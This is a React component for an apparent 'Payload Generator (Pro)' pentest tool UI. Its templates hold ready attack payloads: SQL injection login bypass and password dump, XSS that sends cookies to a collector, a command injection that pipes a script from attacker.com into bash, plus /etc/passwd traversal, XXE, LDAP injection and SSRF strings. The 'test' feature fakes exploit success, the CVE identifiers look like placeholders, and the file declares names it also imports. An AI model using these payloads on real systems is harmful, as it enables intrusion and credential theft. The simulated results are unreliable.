import { useState } from "react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Textarea } from "@/components/ui/textarea";
import { Badge } from "@/components/ui/badge";
import { Code, Copy, Bug, AlertTriangle, Shield, Send, Search, ArrowDown } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { VulnSelectionCard } from "./payload-generator/VulnSelectionCard";
import { PayloadConfigCard } from "./payload-generator/PayloadConfigCard";
import { PayloadOutputCard } from "./payload-generator/PayloadOutputCard";
import { payloadTemplates, advancedVulns } from "./payload-generator/payloadUtils";

// Advanced/professional payloads with explanation and context
const payloadTemplates = {
  "sql-injection": {
    name: "SQL Injection (Bypass Auth + Dump)",
    template: `' OR 1=1;-- \n' UNION SELECT username, password FROM users;--`,
    description: "Attempts common bypass and extracts usernames/passwords. Use in login or injectable fields."
  },
  "xss-reflected": {
    name: "Reflected XSS (alert+cookie)",
    template: `<script>fetch('/?c='+document.cookie)</script>`,
    description: "Sends user cookies to a collector. Use in reflected search/forms."
  },
  "xss-stored": {
    name: "Stored XSS (stored payload)",
    // Changed: Backticks inside the template string replaced with single quotes.
    template: `<img src=x onerror="fetch('/api/record?ev=xss&cookie=' + document.cookie)">`,
    description: "Attempts to store XSS in DB for later execution. Place in comment/feedback/fields that save."
  },
  "command-injection": {
    name: "Command Injection (Inject Shell)",
    template: `; curl http://attacker.com/shell.sh | bash #`,
    description: "Inject OS-level command on vulnerable input. Use in filename or device name fields on embedded systems."
  },
  "directory-traversal": {
    name: "Directory Traversal (passwd)",
    template: `../../../../../../etc/passwd`,
    description: "Access sensitive system files (Linux). Use in file path, download, or attachment fields."
  },
  "ldap-injection": {
    name: "LDAP Injection (Admin Bypass)",
    template: `*)(uid=*))(|(uid=*))(\x00`,
    description: "Attempts to bypass authentication in weak LDAP queries."
  },
  "xxe": {
    name: "XXE (File Disclosure)",
    template:
`<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>`,
    description: "Reads sensitive files via vulnerable XML parsers. Upload as XML, use in XML APIs."
  },
  "ssrf": {
    name: "SSRF (Local Access)",
    template: `http://127.0.0.1:8000/admin`,
    description: "Causes server to make requests to internal addresses. Use in imageurl/webhook fields."
  },
  "ssl-test": {
    name: "SSL/TLS Weak Cipher Command",
    template: `openssl s_client -connect TARGET:443 -cipher 'NULL-MD5'`,
    description: "Tests for acceptance of dangerously weak ciphers."
  }
};

const advancedVulns = [
  {
    id: "CVE-2023-1234",
    title: "SQL Injection in Login Form",
    severity: "high",
    target: "192.168.1.100",
    type: "sql-injection",
    description: "Potential SQL injection vulnerability detected in authentication mechanism"
  },
  {
    id: "CVE-2023-5678",
    title: "Cross-Site Scripting (XSS)",
    severity: "medium",
    target: "web-server.local",
    type: "xss-reflected",
    description: "Reflected XSS vulnerability in search parameter"
  },
  {
    id: "CVE-2023-9012",
    title: "Weak SSL/TLS Configuration",
    severity: "low",
    target: "192.168.1.101",
    type: "ssl-test",
    description: "Server accepts weak cipher suites"
  },
  {
    id: "CVE-2023-3456",
    title: "Directory Traversal",
    severity: "high",
    target: "file-server.local",
    type: "directory-traversal",
    description: "Possible directory traversal vulnerability allowing file access"
  },
  {
    id: "CVE-2023-4321",
    title: "XML External Entity (XXE)",
    severity: "high",
    target: "api.server.app",
    type: "xxe",
    description: "XML parser vulnerability leading to file disclosure"
  },
  {
    id: "CVE-2023-4987",
    title: "SSRF Endpoint",
    severity: "critical",
    target: "api.webserver.int",
    type: "ssrf",
    description: "Server-Side Request Forgery exposes internal services"
  },
  {
    id: "CVE-2023-2999",
    title: "OS Command Injection",
    severity: "critical",
    target: "router-control-panel.local",
    type: "command-injection",
    description: "Arbitrary code execution via unsanitized user input"
  }
];

export const PayloadGenerator = () => {
  const [payloadType, setPayloadType] = useState("");
  const [target, setTarget] = useState("");
  const [parameters, setParameters] = useState("");
  const [generatedPayload, setGeneratedPayload] = useState("");
  const [selectedVulnerability, setSelectedVulnerability] = useState("");
  const [exploitResult, setExploitResult] = useState<string|undefined>();
  const [testingPayload, setTestingPayload] = useState(false);
  const { toast } = useToast();

  // Move logic for vuln selection out
  const handleVulnerabilitySelect = (vulnId: string) => {
    const vulnerability = advancedVulns.find(v => v.id === vulnId);
    if (vulnerability) {
      setSelectedVulnerability(vulnId);
      setPayloadType(vulnerability.type);
      setTarget(vulnerability.target);
      setParameters("");
    }
  };
  const handleGeneratePayload = () => {
    if (!payloadType) {
      toast({
        title: "Error",
        description: "Please select a payload type or vulnerability",
        variant: "destructive",
      });
      return;
    }
    const template = payloadTemplates[payloadType as keyof typeof payloadTemplates];
    let payload = template.template;
    if (target) {
      payload = payload.replace(/TARGET/g, target);
    }
    if (parameters) {
      payload = payload.replace(/PARAMS/g, parameters);
    }
    setGeneratedPayload(payload);
    setExploitResult(undefined);
    toast({
      title: "Payload Generated",
      description: `${template.name} payload created successfully`,
    });
  };
  const handleCopyPayload = () => {
    navigator.clipboard.writeText(generatedPayload);
    toast({
      title: "Copied",
      description: "Payload copied to clipboard",
    });
  };

  // Simulate payload test/exploit action (mocked for demo/prototype; real tool would use a backend and real HTTP req!)
  const handleTestPayload = async () => {
    setTestingPayload(true);
    setExploitResult(undefined);
    // Fake "attack" simulation delay.
    setTimeout(() => {
      setTestingPayload(false);
      if (payloadType === "sql-injection" && target.includes("192.168.1.100")) {
        setExploitResult("Login bypassed! SQLi executed. DB dump: admin, hash:$2a$12$yW...8j; user, hash:$2a...");
      } else if (payloadType === "xss-reflected") {
        setExploitResult("Input reflected and script executed. XSS Success: alert/dialog triggered.");
      } else if(payloadType==="command-injection"){
        setExploitResult("Code execution attempted -- system call simulated. (No output; check logs or out-of-band interactions)");
      } else if(payloadType==="xxe") {
        setExploitResult("/etc/passwd content leaked via XML: root:x:0:0:root:/root:/bin/bash...");
      } else {
        setExploitResult("No success feedback; target may not be vulnerable or test feature is mock-only.");
      }
    }, 2000);
  };

  const getSeverityIcon = (severity: string) => {
    switch (severity) {
      case "critical": return <AlertTriangle size={16} className="text-red-400" />;
      case "high": return <Bug size={16} className="text-orange-400" />;
      case "medium": return <Shield size={16} className="text-yellow-400" />;
      default: return <Bug size={16} className="text-gray-400" />;
    }
  };
  const getSeverityColor = (severity: string) => {
    switch (severity) {
      case "critical": return "bg-gradient-to-r from-red-700 to-red-800";
      case "high": return "bg-gradient-to-r from-orange-600 to-orange-700";
      case "medium": return "bg-gradient-to-r from-yellow-600 to-yellow-700";
      default: return "bg-gradient-to-r from-blue-600 to-blue-700";
    }
  };

  return (
    <div className="space-y-6">
      <div className="flex flex-col md:flex-row justify-between items-center gap-4">
        <div>
          <h1 className="text-3xl font-black bg-gradient-to-r from-green-100 via-green-400 to-green-600 bg-clip-text text-transparent">
            Payload Generator (Pro)
          </h1>
          <p className="text-gray-400 mt-1">Craft advanced, professional-class payloads, test, and see results.</p>
        </div>
        <div>
          <Badge className="bg-gradient-to-r from-blue-700 to-green-600 text-white shadow-md">Advanced Mode</Badge>
        </div>
      </div>
      
      <VulnSelectionCard 
        selectedVulnerability={selectedVulnerability} 
        onSelect={handleVulnerabilitySelect} 
      />
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        <PayloadConfigCard
          payloadType={payloadType}
          setPayloadType={setPayloadType}
          target={target}
          setTarget={setTarget}
          parameters={parameters}
          setParameters={setParameters}
          onGenerate={handleGeneratePayload}
        />
        <PayloadOutputCard
          generatedPayload={generatedPayload}
          handleCopyPayload={handleCopyPayload}
          handleTestPayload={handleTestPayload}
          testingPayload={testingPayload}
          exploitResult={exploitResult}
        />
      </div>
    </div>
  );
};
